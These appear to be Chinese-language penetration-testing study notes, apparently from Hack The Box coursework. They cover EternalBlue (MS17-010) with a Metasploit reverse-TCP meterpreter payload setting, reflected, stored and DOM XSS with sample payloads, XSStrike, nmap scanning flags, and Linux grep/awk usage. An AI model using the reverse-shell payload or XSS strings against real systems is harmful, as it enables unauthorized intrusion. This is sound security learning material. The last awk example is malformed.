验证传输的文件：

``` shell
md5sum xx.sh
```





## 漏洞

### 永恒之蓝

🔍 **漏洞编号**：MS17-010
 🔍 **影响范围**：Windows XP、Windows 7、Windows Server 2003/2008/2012 等
 🔍 **漏洞类型**：远程代码执行（RCE）
 🔍 **攻击方式**：无需身份验证即可远程攻击 Windows 机器

**MS17-010** 是微软在 **2017 年 3 月** 发布的**高危漏洞补丁**，修复了 **Windows SMBv1 服务**（端口 445）中的远程代码执行漏洞。

metaspllit

``` shell
set payload windows/x64/meterpreter/reverse_tcp
```

#### **反向连接（Reverse TCP）**：

- **反向连接** 是一种常见的攻击技术，其中目标机器主动连接回攻击者的机器，而不是攻击者主动连接目标。
- 这种方式可以绕过某些防火墙或网络安全控制，因为很多网络设备只会阻止外部连接进入，而允许内部机器发起连接。



## XSS

由于一些现代浏览器可能会在特定位置阻止`alert()`JavaScript 函数，因此了解其他一些基本的 XSS 负载可能对验证 XSS 的存在很有帮助。 其中一个这样的 XSS 负载是`<plaintext>`，它将停止呈现其后的 HTML 代码并将其显示为纯文本。 另一个容易发现的负载是 ，`<script>print()</script>`它将弹出浏览器打印对话框，不太可能被任何浏览器阻止。 尝试使用这些负载来查看每个负载的工作原理。 您可以使用重置按钮删除任何当前负载。

### 存储型XSS

要查看有效负载是否持久并存储在后端，我们可以刷新页面并查看是否再次收到警报。

测试payload

### 反射型XSS

`Non-Persistent XSS`漏洞有两种类型： `Reflected XSS`，由后端服务器处理；`DOM-based XSS`，完全在客户端处理，永远不会到达后端服务器。与持久性 XSS 不同，`Non-Persistent XSS`漏洞是暂时的，不会通过页面刷新而持久。因此，我们的攻击只会影响目标用户，而不会影响访问该页面的其他用户。

``` shell
<script>alert(window.origin)</script>
```

### DOM XSS

第三种也是最后一种 XSS 类型是另一种`Non-Persistent`称为 的类型`DOM-based XSS`。虽然`reflected XSS`通过 HTTP 请求将输入数据发送到后端服务器，但 DOM XSS 完全通过 JavaScript 在客户端处理。当使用 JavaScript 通过 更改页面源代码时，就会发生 DOM XSS `Document Object Model (DOM)`。

``` js
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```

如果我们尝试之前使用的 XSS 有效负载，我们将看到它不会执行。这是因为该`innerHTML`函数不允许将`<script>`其中的标签用作安全功能。

其他payload

``` html
<img src="" onerror=alert(window.origin)>
```

### XSS 发现

几乎所有 Web 应用程序漏洞扫描程序（如[Nessus](https://www.tenable.com/products/nessus)、[Burp Pro](https://portswigger.net/burp/pro)或[ZAP](https://www.zaproxy.org/)）都具有检测所有三种 XSS 漏洞的各种功能。这些扫描程序通常进行两种类型的扫描：被动扫描（检查客户端代码是否存在潜在的基于 DOM 的漏洞）和主动扫描（发送各种类型的有效负载以尝试通过在页面源中注入有效负载来触发 XSS）。

一些常见的开源工具可以帮助我们发现 XSS，例如[XSS Strike](https://github.com/s0md3v/XSStrike)、[Brute XSS](https://github.com/rajeshmajumdar/BruteXSS)和[XSSer](https://github.com/epsylon/xsser)。我们可以尝试`XSS Strike`将其克隆到我们的 VM 中`git clone`：

``` shell
Fyind@htb[/htb]$ git clone https://github.com/s0md3v/XSStrike.git
Fyind@htb[/htb]$ cd XSStrike
Fyind@htb[/htb]$ pip install -r requirements.txt
Fyind@htb[/htb]$ python xsstrike.py

XSStrike v3.1.4
...SNIP...
```

然后，我们可以运行该脚本并使用 为其提供一个带有参数的 URL `-u`。让我们尝试将其与`Reflected XSS`前面部分中的示例一起使用：



## NMAP

图像化工具 Zenmap

### 基础扫描

扫描常见端口，看看是不是开放的

``` shell
nmap <ip>
```

#### 知道详细的

比如hostname

smb服务的信息

操作系统信息

``` shell
nmap -sCV <ip>
```

### 参数

* `-sC` 运行 Nmap **内置的一些基础脚本**，例如：

  检测 **开放端口** 是否有常见漏洞

  获取 **HTTP 标题**（适用于 Web 端口）

  检测 **匿名 FTP 访问**

  获取 **SSH、SMB、SNMP、DNS** 信息

* `-sV` **尝试识别端口上运行的服务及其版本**。

  适用于检测：

  - **Web 服务器版本**（Apache、Nginx）
  - **SSH 版本**
  - **FTP 服务器**
  - **SMB 版本**
  - **邮件服务器（SMTP、POP3、IMAP）**

* `-oA` 项用于将 Nmap 扫描结果 **同时** 保存为 **三种不同格式** 的文件：

  ``` shell
  nmap -sC -sV -p- -oA full_scan 10.10.10.1
  ```

  保存为 

  ```
  full_scan.nmap
  full_scan.gnmap
  full_scan.xml
  ```

* `-p 445` 指定端口扫描

* `--script safe`  选项用于**执行“安全”类别的 NSE（Nmap Scripting Engine）脚本**，这些脚本不会对目标系统造成任何破坏或异常，主要用于**信息收集**。Nmap 将 NSE 脚本分为不同类别，例如：

  * **safe**（安全）

  - **intrusive**（侵入性）

  - **exploit**（漏洞利用）

  - **vuln**（漏洞检测）

  - **auth**（身份验证）

  - **malware**（恶意软件检测）

  nmap的scripts的路径是 `/usr/share/nmap/scripts/`

  ``` shell
  nmap -p 445 --script "vuln and safe" -Pn -n 10.10.10.40
  ```

  > 只会运行同时被分为vuln和safe分类的脚本

* `-Pn` **跳过 Ping 检测**，直接进行端口扫描（适用于防火墙屏蔽 ICMP）
* `-n` **不解析 DNS**（加快扫描速度）

### 扫描脚本

以 `nse` 结尾



## Metasploit 



### exploit

* `-j` 选项的作用是让漏洞利用模块在后台运行，并将其作为一个 **作业（job）** 来处理。使用 `-j` 后，Metasploit 不会等待该漏洞利用模块的执行完毕，而是会立即返回控制台，允许用户继续执行其他操作或运行其他命令。

### sessions

``` shell
sessions -i 2
```

打开第二个session交互



## Linux常用

### locate

命令用于在 Linux 系统中**快速搜索文件或目录**，比 `find` 命令**速度更快**，但依赖于数据库（`mlocate.db`），并不是实时搜索。

``` shell
locate lue | grep .nse$
```

> **查找包含 "lue" 的文件，并筛选出以 `.nse` 结尾的文件**（Nmap 脚本文件）

### less

打开文件内容，但是显示更少行/

* `/categor` 右斜杠可以进行搜索

### grep

搜索工具

``` shell
grep -r categories /path/to/directory
```

> 目录下递归地搜索包含 `categories` 关键字的文件内容。

* `-r` 是递归的搜索

* `-o` 只输出匹配的部分，而不是整个包含匹配的行。

* `-P` 启用 Perl 兼容正则表达式（PCRE），这意味着你可以使用更复杂和强大的正则表达式

  ``` shell
  grep -r categories /usr/share/nmap/scripts/*.nse | grep -oP '".*?"'
  ```

  > 这是一个正则表达式，用于匹配在双引号内的内容。`.`：匹配除换行符以外的任何单个字符。`*`：表示前面的字符（`.`）匹配零次或多次。`?`：使 `*` 变得**非贪婪**，即尽可能少地匹配字符，而不是尽可能多地匹配字符。这样它会匹配**最小的内容**，直到遇到下一个双引号为止。

### sort 

对输入的行进行排序

* `-u` 去重

### awk

`awk` 是一个强大的文本处理工具，用于处理以空格、制表符或自定义分隔符分隔的文本数据。它通常用于模式匹配、文本提取和报告生成等任务。

* `-F:` 选项用于指定 **字段分隔符**，这意味着字段是以 **冒号（`:`）** 作为分隔符。 

* `{print $1}` **`$1`**：在 `awk` 中，`$1` 代表 **第一个字段**（字段是通过 `-F` 选项定义的分隔符分隔的部分）

  ``` shell
  grep -r categories /usr/share/nmap/scripts/*.nse | grep default | awk -F '{print $1}'
  ```

  

